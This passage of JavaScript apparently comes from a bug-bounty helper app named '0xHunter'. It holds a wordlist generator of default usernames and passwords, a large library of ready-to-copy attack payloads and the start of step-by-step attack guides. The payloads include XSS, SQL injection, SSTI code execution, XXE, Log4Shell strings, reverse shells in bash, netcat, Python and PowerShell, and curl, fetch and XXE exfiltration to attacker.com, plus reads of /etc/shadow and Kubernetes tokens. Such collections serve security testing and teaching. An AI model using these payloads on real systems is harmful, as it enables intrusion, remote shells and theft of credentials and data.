      processedText = processedText.replace(/\{target\}/gi, targetVal)
                                   .replace(/\{\{target\}\}/gi, targetVal)
                                   .replace(/\{domain\}/gi, targetVal)
                                   .replace(/\{\{domain\}\}/gi, targetVal);
    }
    if (paramVal) {
      processedText = processedText.replace(/\{param\}/gi, paramVal)
                                   .replace(/\{\{param\}\}/gi, paramVal);
    }
    return originalWriteText.call(navigator.clipboard, processedText);
  };
})();

(async function init() {
  await loadData();
  loadGlobalVariables();
  renderCmdResults('');
})();

// --- MASSIVE FEATURE EXPANSION ---
// 1. WORDLIST GENERATOR
function generateWordlist() {
  const type = document.getElementById('wl-type').value;
  const kwInput = document.getElementById('wl-keywords').value.trim();
  const keywords = kwInput ? kwInput.split('\n').map(k=>k.trim()).filter(Boolean) : [];
  const extInput = document.getElementById('wl-exts').value.trim();
  const exts = extInput ? extInput.split(',').map(e=>e.trim().startsWith('.')?e:`.${e}`).filter(Boolean) : [];
  
  const addNums = document.getElementById('wl-nums').checked;
  const addYears = document.getElementById('wl-years').checked;
  const upper = document.getElementById('wl-upper').checked;
  
  let baseList = [];
  
  if (type === 'dirs' && keywords.length === 0) {
    baseList = ['admin', 'api', 'backup', 'config', 'dev', 'test', 'staging', 'v1', 'v2', 'login', 'dashboard', 'secret', 'assets'];
  } else if (type === 'subdomain' && keywords.length === 0) {
    baseList = ['www', 'mail', 'remote', 'blog', 'webmail', 'server', 'ns1', 'ns2', 'smtp', 'secure', 'vpn', 'api', 'dev', 'staging'];
  } else if (type === 'params' && keywords.length === 0) {
    baseList = ['id', 'user', 'dir', 'file', 'page', 'cmd', 'url', 'redirect', 'next', 'host', 'port', 'query', 'q'];
  } else if (type === 'users' && keywords.length === 0) {
    baseList = ['admin', 'root', 'user', 'test', 'guest', 'info', 'support', 'sales', 'webmaster'];
  } else if (type === 'passwords' && keywords.length === 0) {
    baseList = ['password', '123456', 'admin', 'qwerty', 'welcome', 'letmein', 'secret'];
  } else {
    baseList = [...keywords];
  }

  let results = new Set(baseList);
  
  // Modifications
  let currentList = Array.from(results);
  
  if (upper) {
    currentList.forEach(w => {
      results.add(w.toUpperCase());
      results.add(w.charAt(0).toUpperCase() + w.slice(1));
    });
  }
  
  currentList = Array.from(results);
  if (addNums) {
    currentList.forEach(w => {
      for(let i=1; i<=5; i++) { results.add(`${w}${i}`); results.add(`${w}0${i}`); }
    });
  }
  
  currentList = Array.from(results);
  if (addYears) {
    currentList.forEach(w => {
      for(let y=2020; y<=2026; y++) { results.add(`${w}${y}`); }
    });
  }
  
  // Extensions (only for dirs/files)
  if ((type === 'dirs' || type === 'custom') && exts.length > 0) {
    currentList = Array.from(results);
    let withExts = new Set();
    currentList.forEach(w => {
      withExts.add(w); // without ext
      exts.forEach(e => withExts.add(`${w}${e}`));
    });
    results = withExts;
  }

  const finalArr = Array.from(results);
  document.getElementById('wl-output').textContent = finalArr.join('\n');
  document.getElementById('wl-count').textContent = `Total lines: ${finalArr.length}`;
}

function copyWordlist() {
  const txt = document.getElementById('wl-output').textContent;
  if(!txt || txt.includes('Click Generate')) return;
  navigator.clipboard.writeText(txt).then(()=>toast('Wordlist copied!'));
}

function downloadWordlist() {
  const txt = document.getElementById('wl-output').textContent;
  if(!txt || txt.includes('Click Generate')) return;
  let a = document.createElement('a');
  a.href = 'data:text/plain;charset=utf-8,' + encodeURIComponent(txt);
  a.download = '0xHunter_Wordlist.txt';
  a.click();
}


// 2. MASSIVE PAYLOAD LIBRARY EXPANSION
const massivePayloads = [
  // XSS - Basic & Advanced
  { cat: 'XSS', name: 'Basic Alert', payload: '<script>alert(1)</script>' },
  { cat: 'XSS', name: 'Image Error', payload: '<img src=x onerror=alert(1)>' },
  { cat: 'XSS', name: 'SVG OnLoad', payload: '<svg onload=alert(1)>' },
  { cat: 'XSS', name: 'Body OnLoad', payload: '<body onload=alert(1)>' },
  { cat: 'XSS', name: 'Iframe JS', payload: '<iframe src="javascript:alert(1)"></iframe>' },
  { cat: 'XSS', name: 'WAF Bypass Mixed Case', payload: '<sCrIpT>alert(1)</ScRiPt>' },
  { cat: 'XSS', name: 'Data URI', payload: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==' },
  { cat: 'XSS', name: 'Autofocus', payload: '<input autofocus onfocus=alert(1)>' },
  { cat: 'XSS', name: 'Details Tag', payload: '<details ontoggle=alert(1)>' },
  { cat: 'XSS', name: 'Angular Template', payload: '{{constructor.constructor(\'alert(1)\')()}}' },
  { cat: 'XSS', name: 'Vue.js Template', payload: '{{_self.env.constructor("alert(1)")()}}' },
  { cat: 'XSS', name: 'Markdown XSS', payload: '[a](javascript:prompt(1))' },
  { cat: 'XSS', name: 'JaVasCript URI', payload: 'javascript:eval(\'var a=document.createElement(\\\'script\\\');a.src=\\\'https://attacker.com/xss.js\\\';document.body.appendChild(a)\')' },
  { cat: 'XSS', name: 'Polyglot 1', payload: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e' },

  // SQL Injection
  { cat: 'SQLi', name: 'Auth Bypass 1', payload: '\' OR 1=1 --' },
  { cat: 'SQLi', name: 'Auth Bypass 2', payload: 'admin\' -- -' },
  { cat: 'SQLi', name: 'Auth Bypass 3', payload: '\' OR \'a\'=\'a' },
  { cat: 'SQLi', name: 'Auth Bypass 4', payload: '" OR "a"="a' },
  { cat: 'SQLi', name: 'Auth Bypass 5', payload: '\') OR (\'a\'=\'a' },
  { cat: 'SQLi', name: 'Time Based MySQL', payload: '\' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--' },
  { cat: 'SQLi', name: 'Time Based PostgreSQL', payload: '\'; SELECT pg_sleep(5)--' },
  { cat: 'SQLi', name: 'Time Based MSSQL', payload: '\'; WAITFOR DELAY \'0:0:5\'--' },
  { cat: 'SQLi', name: 'Time Based Oracle', payload: '\' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(\'a\',5)--' },
  { cat: 'SQLi', name: 'Time Based SQLite', payload: '\' AND [RANDOM]%5=0--' },
  { cat: 'SQLi', name: 'UNION Select', payload: '\' UNION SELECT 1,2,3,4--' },
  { cat: 'SQLi', name: 'Error Based MySQL', payload: '\' AND extractvalue(rand(),concat(0x3a,version()))--' },
  { cat: 'SQLi', name: 'Error Based Postgres', payload: '\' AND 1=CAST((SELECT version()) AS int)--' },

  // NoSQL Injection
  { cat: 'NoSQLi', name: 'Auth Bypass (JSON)', payload: '{"username": {"$gt": ""}, "password": {"$gt": ""}}' },
  { cat: 'NoSQLi', name: 'Regex Extraction', payload: '{"username": "admin", "password": {"$regex": "^a"}}' },
  { cat: 'NoSQLi', name: 'Where Operator', payload: '{"$where": "this.password.match(/^a/)"}' },
  { cat: 'NoSQLi', name: 'Array Injection PHP', payload: 'username[$ne]=foo&password[$ne]=bar' },

  // SSRF
  { cat: 'SSRF', name: 'AWS Metadata', payload: 'http://169.254.169.254/latest/meta-data/' },
  { cat: 'SSRF', name: 'AWS IAM Credentials', payload: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
  { cat: 'SSRF', name: 'AWS User Data', payload: 'http://169.254.169.254/latest/user-data/' },
  { cat: 'SSRF', name: 'GCP Metadata', payload: 'http://metadata.google.internal/computeMetadata/v1/' },
  { cat: 'SSRF', name: 'DigitalOcean Metadata', payload: 'http://169.254.169.254/metadata/v1.json' },
  { cat: 'SSRF', name: 'Alibaba Cloud Metadata', payload: 'http://100.100.100.200/latest/meta-data/' },
  { cat: 'SSRF', name: 'Localhost (Dec)', payload: 'http://2130706433/' },
  { cat: 'SSRF', name: 'Localhost (Oct)', payload: 'http://0177.0.0.1/' },
  { cat: 'SSRF', name: 'Localhost (Hex)', payload: 'http://0x7F000001/' },
  { cat: 'SSRF', name: 'DNS Rebinding', payload: 'http://127.0.0.1.nip.io/' },
  { cat: 'SSRF', name: 'File URI Passwd', payload: 'file:///etc/passwd' },
  { cat: 'SSRF', name: 'Dict URI (Redis)', payload: 'dict://127.0.0.1:6379/info' },
  { cat: 'SSRF', name: 'Gopher URI (SMTP)', payload: 'gopher://127.0.0.1:25/_HELO%20localhost%250d%250aMAIL%20FROM...' },

  // LFI / Path Traversal
  { cat: 'LFI', name: 'Linux Passwd Basic', payload: '../../../../../../../../etc/passwd' },
  { cat: 'LFI', name: 'Linux Hosts', payload: '../../../../../../../../etc/hosts' },
  { cat: 'LFI', name: 'Windows INI', payload: '..\\..\\..\\..\\..\\..\\windows\\win.ini' },
  { cat: 'LFI', name: 'Null Byte Bypass', payload: '../../../../../../../../etc/passwd%00' },
  { cat: 'LFI', name: 'Double URL Encode', payload: '%252e%252e%252f%252e%252e%252fetc%252fpasswd' },
  { cat: 'LFI', name: 'PHP Filter Base64', payload: 'php://filter/convert.base64-encode/resource=index.php' },
  { cat: 'LFI', name: 'PHP Filter Rot13', payload: 'php://filter/string.rot13/resource=index.php' },
  { cat: 'LFI', name: 'PHP Expect (RCE)', payload: 'expect://id' },
  { cat: 'LFI', name: 'Proc Environ (RCE)', payload: '../../../../../../../../proc/self/environ' },

  // SSTI
  { cat: 'SSTI', name: 'Jinja2/Twig Basic', payload: '{{7*7}}' },
  { cat: 'SSTI', name: 'Jinja2 RCE 1', payload: '{{ self.__init__.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read() }}' },
  { cat: 'SSTI', name: 'Jinja2 RCE 2', payload: '{{ config.__class__.__init__.__globals__[\'os\'].popen(\'ls\').read() }}' },
  { cat: 'SSTI', name: 'Jinja2 Config', payload: '{{ config.items() }}' },
  { cat: 'SSTI', name: 'Tornado', payload: '{% import os %}{{ os.popen("id").read() }}' },
  { cat: 'SSTI', name: 'FreeMarker RCE', payload: '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }' },
  { cat: 'SSTI', name: 'Velocity RCE', payload: '#set($str=$class.inspect("java.lang.String").type)' },
  { cat: 'SSTI', name: 'Spring EL RCE', payload: '${T(java.lang.Runtime).getRuntime().exec(\'id\')}' },
  { cat: 'SSTI', name: 'Ruby ERB RCE', payload: '<%= `id` %>' },
  { cat: 'SSTI', name: 'Smarty PHP RCE', payload: '{system(\'id\')}' },

  // XXE
  { cat: 'XXE', name: 'Basic File Read', payload: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY read SYSTEM "file:///etc/passwd">]><root>&read;</root>' },
  { cat: 'XXE', name: 'OOB Exfiltration', payload: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/eval.dtd">%remote;]>' },
  { cat: 'XXE', name: 'Blind XXE', payload: '<?xml version="1.0"?><!DOCTYPE data SYSTEM "http://attacker.com/dtd">' },
  { cat: 'XXE', name: 'XInclude', payload: '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>' },

  // Command Injection (OSCI)
  { cat: 'OSCI', name: 'Ping Sleep', payload: '; ping -c 5 127.0.0.1 ;' },
  { cat: 'OSCI', name: 'Netcat Rev Shell', payload: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f' },
  { cat: 'OSCI', name: 'Python Rev Shell', payload: 'python -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'' },
  { cat: 'OSCI', name: 'Bash TCP', payload: 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1' },
  { cat: 'OSCI', name: 'Curl Exfil', payload: '$(curl http://attacker.com/`whoami`)' },
  { cat: 'OSCI', name: 'Wget Exfil', payload: '| wget http://attacker.com/$(whoami)' },
  { cat: 'OSCI', name: 'Bypass Space (IFS)', payload: ';cat${IFS}/etc/passwd;' },
  { cat: 'OSCI', name: 'Bypass Space (Brace)', payload: ';{cat,/etc/passwd};' },

  // Open Redirect
  { cat: 'Redirect', name: 'Basic URL', payload: 'http://attacker.com' },
  { cat: 'Redirect', name: 'Double Slash', payload: '//attacker.com' },
  { cat: 'Redirect', name: 'Backslash', payload: '\\attacker.com' },
  { cat: 'Redirect', name: 'Encoded', payload: '%2f%2fattacker.com' },
  { cat: 'Redirect', name: 'XSS via Redirect', payload: 'javascript:alert(1)' },

  // CRLF Injection
  { cat: 'CRLF', name: 'Set Cookie Header', payload: '%0d%0aSet-Cookie:%20hacked=true' },
  { cat: 'CRLF', name: 'XSS via CRLF', payload: '%0d%0aContent-Length:%2035%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(1)>%0d%0a0%0d%0a/%0d%0a' },

  // Prototype Pollution
  { cat: 'ProtoPoll', name: 'Query String Injection', payload: '?__proto__[isAdmin]=true' },
  { cat: 'ProtoPoll', name: 'JSON Injection', payload: '{"__proto__":{"isAdmin":true}}' },
  { cat: 'ProtoPoll', name: 'Constructor Payload', payload: '{"constructor": {"prototype": {"isAdmin": true}}}' },

  // LDAP Injection
  { cat: 'LDAP', name: 'Auth Bypass 1', payload: '*)(uid=*))(|(uid=*' },
  { cat: 'LDAP', name: 'Auth Bypass 2', payload: 'admin)(|(&' },
  { cat: 'LDAP', name: 'Data Extraction', payload: 'admin)(password=a*)' },

  // Deserialization
  { cat: 'Deserial', name: 'Python Pickle (RCE)', payload: 'cos\\nsystem\\n(S\'id\'\\ntR.' },
  { cat: 'Deserial', name: 'PHP Object Magic', payload: 'O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}' },

  // Edge Side Includes (ESI)
  { cat: 'ESI', name: 'ESI SSRF', payload: '<esi:include src="http://attacker.com/"/>' },
  { cat: 'ESI', name: 'ESI Cookie Theft', payload: '<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE)"/>' },

  // Log4j (Log4Shell)
  { cat: 'Log4j', name: 'Basic JNDI LDAP', payload: '${jndi:ldap://attacker.com/a}' },
  { cat: 'Log4j', name: 'WAF Bypass 1', payload: '${${lower:j}ndi:ldap://attacker.com/a}' },
  { cat: 'Log4j', name: 'WAF Bypass 2', payload: '${jndi:${lower:l}${lower:d}ap://attacker.com/a}' },
  { cat: 'Log4j', name: 'DNS Exfiltration', payload: '${jndi:dns://${sys:user.name}.attacker.com/a}' },

  // GraphQL
  { cat: 'GraphQL', name: 'Introspection Query', payload: '{"query": "\\n    query IntrospectionQuery {\\n      __schema {\\n        queryType { name }\\n        mutationType { name }\\n        types {\\n          ...FullType\\n        }\\n      }\\n    }\\n    fragment FullType on __Type {\\n      kind\\n      name\\n      description\\n      fields(includeDeprecated: true) {\\n        name\\n        description\\n        args {\\n          ...InputValue\\n        }\\n        type {\\n          ...TypeRef\\n        }\\n        isDeprecated\\n        deprecationReason\\n      }\\n      inputFields {\\n        ...InputValue\\n      }\\n      interfaces {\\n        ...TypeRef\\n      }\\n      enumValues(includeDeprecated: true) {\\n        name\\n        description\\n        isDeprecated\\n        deprecationReason\\n      }\\n      possibleTypes {\\n        ...TypeRef\\n      }\\n    }\\n    fragment InputValue on __InputValue {\\n      name\\n      description\\n      type { ...TypeRef }\\n      defaultValue\\n    }\\n    fragment TypeRef on __Type {\\n      kind\\n      name\\n      ofType {\\n        kind\\n        name\\n        ofType {\\n          kind\\n          name\\n          ofType {\\n            kind\\n            name\\n          }\\n        }\\n      }\\n    }\\n  "}' },
  { cat: 'GraphQL', name: 'Batching Attack', payload: '[{"query":"query{login(user:\\"admin\\",pass:\\"123\\"){token}}"},{"query":"query{login(user:\\"admin\\",pass:\\"password\\"){token}}"}]' },
  { cat: 'GraphQL', name: 'Alias Overloading', payload: 'query { a: login(pass:"123") { token } b: login(pass:"password") { token } }' },

  // XPath Injection
  { cat: 'XPath', name: 'Auth Bypass 1', payload: '\' or \'1\'=\'1' },
  { cat: 'XPath', name: 'Auth Bypass 2', payload: '1\' or 1=1 or \'a\'=\'a' },
  { cat: 'XPath', name: 'Extract Parent', payload: '\' or /*/parent::*//*=\'' },
  { cat: 'XPath', name: 'String Length Blind', payload: '\' and string-length(password)=10 and \'1\'=\'1' },

  // XSS (Advanced & Polyglots)
  { cat: 'XSS', name: 'Polyglot 2', payload: '">><script>/*<svg/onload=\'+"`"+\'*/</script>\\x3cimg src=1 onerror=alert(1)\\x3e' },
  { cat: 'XSS', name: 'Polyglot 3', payload: '\'\';!--"<XSS>=&{()}' },
  { cat: 'XSS', name: 'Math JS Execution', payload: '<math><mi>//</mi><script>alert(1)</script></math>' },
  { cat: 'XSS', name: 'Object Tag', payload: '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>' },
  { cat: 'XSS', name: 'OnPointerEnter', payload: '<h1 onpointerenter=alert(1)>Hover me</h1>' },
  { cat: 'XSS', name: 'Hidden Input Bypass', payload: '<input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+X)' },

  // Windows Command Injection
  { cat: 'OSCI', name: 'Windows Ping Sleep', payload: '& ping -n 6 127.0.0.1 &' },
  { cat: 'OSCI', name: 'Windows CMD Reverse Shell', payload: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' },
  { cat: 'OSCI', name: 'Windows Bypasses', payload: 'w^h^o^a^m^i' },

  // Host Header Injection / Cache
  { cat: 'Cache', name: 'Web Cache Deception', payload: 'http://target.com/profile/nonexistent.css' },
  { cat: 'Cache', name: 'Cache Poisoning X-Forwarded', payload: 'X-Forwarded-Host: attacker.com' },

  // Cloud Metadata / SSRF (Additional)
  { cat: 'SSRF', name: 'Azure Metadata', payload: 'http://169.254.169.254/metadata/instance?api-version=2017-08-01' },
  { cat: 'SSRF', name: 'Kubelet API', payload: 'https://127.0.0.1:10250/pods' },
  { cat: 'SSRF', name: 'Docker API', payload: 'http://127.0.0.1:2375/containers/json' },

  // JSON Injection
  { cat: 'JSONi', name: 'JSON Parameter Pollution', payload: '{"userid": 1, "userid": 2}' },
  { cat: 'JSONi', name: 'JSON Boolean Bypass', payload: '{"isAdmin": true}' },

  // HTML Injection
  { cat: 'HTMLi', name: 'Basic HTML', payload: '<h1>Injected</h1>' },
  { cat: 'HTMLi', name: 'Form Hijack', payload: '<form action="http://attacker.com"><input type="submit"></form>' },
  { cat: 'HTMLi', name: 'CSS Keylogger', payload: '<style>input[value^="a"] { background-image: url("http://attacker.com/a"); }</style>' },

  // Privilege Escalation (Enumeration Only)
  { cat: 'PrivEsc', name: 'Linux SUID Check', payload: 'find / -perm -u=s -type f 2>/dev/null' },
  { cat: 'PrivEsc', name: 'Linux Sudo Rights', payload: 'sudo -l' },
  { cat: 'PrivEsc', name: 'Linux Cron Jobs', payload: 'cat /etc/crontab; ls -la /etc/cron.*' },
  { cat: 'PrivEsc', name: 'Linux Capabilities', payload: 'getcap -r / 2>/dev/null' },
  { cat: 'PrivEsc', name: 'Linux Writable Dirs', payload: 'find / -writable -type d 2>/dev/null' },
  { cat: 'PrivEsc', name: 'Linux Active Connections', payload: 'ss -tulpn or netstat -antup' },
  { cat: 'PrivEsc', name: 'Linux Readable /etc/shadow', payload: 'ls -la /etc/shadow; cat /etc/shadow' },
  { cat: 'PrivEsc', name: 'Linux Dynamic Library Path', payload: 'echo $LD_LIBRARY_PATH' },
  { cat: 'PrivEsc', name: 'Linux User Accounts', payload: 'cut -d: -f1,3 /etc/passwd' },
  { cat: 'PrivEsc', name: 'Linux Kernel Version', payload: 'uname -a; cat /etc/issue' },
  { cat: 'PrivEsc', name: 'Windows Privileges', payload: 'whoami /priv' },
  { cat: 'PrivEsc', name: 'Windows AutoRuns', payload: 'reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' },
  { cat: 'PrivEsc', name: 'Windows Services', payload: 'wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"' },
  { cat: 'PrivEsc', name: 'Windows User Accounts', payload: 'net user; net localgroup administrators' },
  { cat: 'PrivEsc', name: 'Windows Network Info', payload: 'ipconfig /all; route print; arp -a' },
  { cat: 'PrivEsc', name: 'Windows Unquoted Service Paths', payload: 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v """' },
  { cat: 'PrivEsc', name: 'Windows AlwaysInstallElevated Query', payload: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated; reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated' },

  // Additional Injection and Scanning Payloads
  { cat: 'SQLi', name: 'Time-Based MySQL (BENCHMARK)', payload: '\' AND BENCHMARK(10000000,MD5(1))--' },
  { cat: 'SQLi', name: 'Error-Based PostgreSQL (Query XML)', payload: '\' AND query_to_xml(\'select version()\',true,true,true)--' },
  { cat: 'LFI', name: 'Linux Log Poisoning SSH', payload: '/var/log/auth.log' },
  { cat: 'LFI', name: 'Linux Log Poisoning Apache', payload: '/var/log/apache2/access.log' },
  { cat: 'LFI', name: 'Windows Boot.ini', payload: '..\\..\\..\\..\\..\\..\\boot.ini' },
  { cat: 'XSS', name: 'CORS Bypass / Origin Leak', payload: '<script>fetch("http://attacker.com/?cookie="+document.cookie)</script>' },
  { cat: 'SSRF', name: 'Oracle Cloud Metadata', payload: 'http://192.0.0.192/latest/' },
  { cat: 'SSRF', name: 'Kubernetes Secrets Directory', payload: 'file:///var/run/secrets/kubernetes.io/serviceaccount/token' },
  { cat: 'SSTI', name: 'Python MRO Escape (Jinja2)', payload: '{{ "".__class__.__mro__[2].__subclasses__() }}' },

  // JWT (JSON Web Tokens) Bypasses
  { cat: 'JWT', name: 'None Algorithm (Alg: none)', payload: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlfQ.' },
  { cat: 'JWT', name: 'None Algorithm (Alg: NONE)', payload: 'eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlfQ.' },
  { cat: 'JWT', name: 'None Algorithm (No Signature)', payload: 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ' },
  { cat: 'JWT', name: 'Key Confusion (HMAC/RSA)', payload: 'Set algorithm to HS256 using public RSA key as secret' },

  // HRS (HTTP Request Smuggling)
  { cat: 'HRS', name: 'CL.TE Basic Template', payload: 'POST / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nG' },
{ cat: 'HRS', name: 'TE.CL Basic Template', payload: 'POST / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nG\\r\\n0\\r\\n\\r\\n' },

  // OAuth Vulnerabilities
  { cat: 'OAuth', name: 'Redirect URI Bypass (evil.com)', payload: 'redirect_uri=https://target.com.evil.com/callback' },
  { cat: 'OAuth', name: 'Redirect URI Bypass (Path Traversal)', payload: 'redirect_uri=https://target.com/callback/../../evil.com' },
  { cat: 'OAuth', name: 'State Parameter Missing', payload: 'Remove state parameter from auth flow to test for CSRF' },

  // CORS Misconfigurations
  { cat: 'CORS', name: 'Origin Reflection Test', payload: 'Origin: https://attacker.com' },
  { cat: 'CORS', name: 'Null Origin Reflection', payload: 'Origin: null' }
];

// Override the payload variable defined earlier
window.payloads = massivePayloads;


// 3. MASSIVE ATTACK GUIDES
const massiveGuides = [
  {
    title: 'SQL Injection (SQLi)',
    desc: 'Manipulate backend database queries to extract sensitive data or execute commands.',
    icon: '🗄️',
    severity: 'High to Critical',
    bounty: '$1,000 - $10,000+',
    steps: [
      'Identify database inputs: URL parameters, JSON/XML bodies, headers, and forms.',
      'Inject trigger characters: `\'`, `"`, `\\`, and `;` to observe application errors (Error-based).',
      'Test conditional logical assertions: `\' OR 1=1--` vs `\' AND 1=2--` (Boolean-blind).',
      'Inject sleep functions: `\' AND SLEEP(5)--` or `\' WAITFOR DELAY \'0:0:5\'--` (Time-blind).',
      'Map schema and extract data: `\' UNION SELECT NULL,NULL,username,password FROM users--`.',
      'Automate target dump with SQLMap: `sqlmap -u "http://target.com/vuln?id=1" --batch --dbs`.'
    ],
    remediation: 'Use parameterized queries/prepared statements, enforce input whitelist validation, and apply the principle of least privilege to the database user.'
  },
  {
    title: 'Cross-Site Scripting (XSS)',
    desc: 'Inject malicious scripts into pages viewed by other users.',
    icon: '🕷️',
    severity: 'Low to High',
    bounty: '$500 - $5,000',
    steps: [
      'Locate reflection points: Search fields, URL params, custom headers, or inputs stored in the database.',
      'Inject probe characters: `\'"><XSSProbe>` to check encoding and filter responses.',
      'Test Reflected XSS: Inject tags into parameters that reflect immediately in the page.',
      'Test Stored XSS: Inject scripts into persistent data fields (e.g. usernames, comments, profiles).',
      'Test DOM XSS: Identify unsafe JavaScript sources (e.g. `location.hash`) feeding into sinks (e.g. `innerHTML`).',
      'Bypass WAFs using event handlers: `<svg onload=alert(1)>`, `<input autofocus onfocus=alert(1)>`.',
      'Deliver payload via file uploads: Upload an SVG file containing a script element.'
    ],
    remediation: 'Implement Context-Aware Output Encoding (HTML, JS, Attribute), use Content Security Policy (CSP) headers, and sanitize input using a library like DOMPurify.'
  },
  {
    title: 'Insecure Direct Object Reference (IDOR)',
    desc: 'Access or modify resources of another user by changing identifier values.',
    icon: '🔓',
    severity: 'Medium to High',
    bounty: '$500 - $7,500',
    steps: [
      'Register two accounts (Attacker & Victim) to obtain valid resource IDs.',
      'Locate private endpoints using IDs (e.g., `/api/user/1234/profile` or `/docs?id=99`).',
      'Attempt to access the victim\'s resource ID from the attacker\'s session/cookies.',
      'Test state-changing methods (POST/PUT/DELETE) to modify or delete resource IDs.',
      'Try bypasses: negative values (`?id=-1`), arrays (`?id[]=123&id[]=124`), or parameter pollution.',
      'Test alternative encodings: Convert sequential IDs to Base64, Hex, or GUID formats.'
    ],
    remediation: 'Enforce robust object-level access control checks on every server-side transaction instead of relying on client-side obfuscation.'
  },
  {
    title: 'Server-Side Request Forgery (SSRF)',
    desc: 'Coerce the server into making HTTP requests to internal or external hosts.',
    icon: '🌐',
    severity: 'Medium to Critical',
    bounty: '$1,000 - $10,000+',
    steps: [
      'Find functionalities accepting URLs: Webhooks, file imports, PDF generators, image downloaders.',
      'Submit an out-of-band domain (e.g. Burp Collaborator) to check for outbound DNS/HTTP requests.',
      'Scan internal network ranges and local ports: `http://127.0.0.1:80/` or `http://192.168.1.1/`.',
      'Query cloud service metadata: AWS/GCP (`http://169.254.169.254/latest/meta-data/`) or Azure.',
      'Bypass URL filters using decimal IPs (`http://2130706433`), IPv6 (`http://[::1]`), or local DNS names (`127.0.0.1.nip.io`).',
      'Try alternative protocol schemes: `file:///etc/passwd`, `gopher://`, `dict://`.'
    ],
    remediation: 'Implement strict destination IP/domain whitelists, block access to local/private ranges, restrict protocols to HTTP/S, and secure cloud metadata access.'
  },
  {
    title: 'Local File Inclusion (LFI) & Path Traversal',
    desc: 'Read arbitrary server files or execute local system scripts.',
    icon: '📂',
    severity: 'Medium to High',
    bounty: '$500 - $5,000',
    steps: [
      'Locate file path parameters: `?file=`, `?doc=`, `?template=`, `?image=`.',
      'Inject traversal directory sequences: `../../../../etc/passwd` or `..\\..\\..\\windows\\win.ini`.',
      'Bypass filters using nested sequences (`....//....//`), null bytes (`%00`), or URL encoding.',
      'Retrieve source files using wrappers: `php://filter/convert.base64-encode/resource=config.php`.',
      'Test for Remote File Inclusion (RFI) by supplying a remote script URL.'
    ],
    remediation: 'Avoid passing user-supplied filenames to filesystem APIs, validate paths using canonicalized lookups, and use index-based/whitelisted maps.'
  },
  {
    title: 'Server-Side Template Injection (SSTI)',
    desc: 'Inject executable expressions into web template engines.',
    icon: '⚙️',
    severity: 'High to Critical',
    bounty: '$1,500 - $10,000+',
    steps: [
      'Locate inputs reflecting user text inside template context.',
      'Inject math indicators: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`. If it evaluates to 49, SSTI is active.',
      'Determine the template engine: `${7*\'7\'}` returning `7777777` (Jinja2) or `49` (Twig).',
      'Escalate to RCE: Use engine exploit scripts (e.g. accessing `__globals__` in Jinja2 to import `os` and call `popen`).'
    ],
    remediation: 'Ensure template context variables are passed safely as data parameters rather than concatenated directly into templates; run template engines in restricted sandboxes.'
  },
  {
    title: 'XML External Entity (XXE)',
    desc: 'Exploit weakly configured XML parsers to read files or execute server requests.',
    icon: '📜',
    severity: 'High to Critical',
    bounty: '$1,000 - $8,000',
    steps: [
      'Identify XML endpoints: SOAP APIs, SAML configurations, RSS feeds, or SVG uploads.',
      'Try changing Content-Type to `application/xml` in JSON requests to see if XML is parsed.',
      'Inject a basic external entity: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root>&xxe;</root>`.',
      'Perform blind exfiltration: Direct the SYSTEM entity to an external DTD to retrieve file data out-of-band.',
